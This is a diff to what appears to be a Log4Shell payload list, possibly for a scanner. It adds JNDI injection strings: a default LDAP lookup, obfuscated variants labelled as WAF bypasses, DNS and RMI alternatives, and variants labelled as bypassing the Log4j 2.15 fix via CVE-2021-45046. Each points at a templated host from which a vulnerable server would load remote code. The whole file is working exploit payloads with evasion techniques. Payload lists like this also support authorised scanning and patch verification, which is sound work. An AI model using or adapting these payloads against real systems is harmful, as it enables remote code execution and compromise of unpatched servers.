@@ -1,3 +1,15 @@
+# Default payload
 ${jndi:ldap://{{URI}}}
+
+# Bypass WAF
 ${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://{{URI}}}
 ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{URI}}}
+
+# Bypass WAF by not using LDAP
+${jndi:dns://{{URI}}}
+${jndi:rmi://{{URI}}}
+
+# Bypass 2.15 using CVE-2021-45046
+${jndi:ldap://127.0.0.1#{{URI}}}
+${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://127.0.0.1#{{URI}}}
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1#{{URI}}}
